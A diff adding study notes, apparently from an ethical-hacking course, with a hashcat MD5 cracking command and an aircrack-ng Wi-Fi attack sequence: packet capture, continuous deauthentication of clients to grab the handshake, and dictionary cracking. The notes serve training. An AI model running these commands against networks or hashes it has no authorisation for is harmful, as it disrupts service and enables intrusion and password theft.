@@ -11,3 +11,20 @@ Module 03: Scanning Networks:
 	Port and Service Discovery using NetScanTools Pro
 	Port scanning using sx tool
 
+
+Hashcat
+	hashcat -m 0 xxxxxxxx /rockyou.txt --force -O
+
+Wi-FI
+	start monitoring
+		airodump-ng wlan0mon
+
+	monitor open wifi 
+		airodump-ng --bssid xxxxxx --channel X --write capture wlan0mon
+
+	send de-auth packet to above captured bssid so that we can capture hash when device reconnect back to wifi
+		aireplay-ng --deauth 0 -a x.x.bssid wlan0mon
+
+
+	crack
+		aircrack-ng -b x.x.xb.s.s.id -w password.txt capture.cap
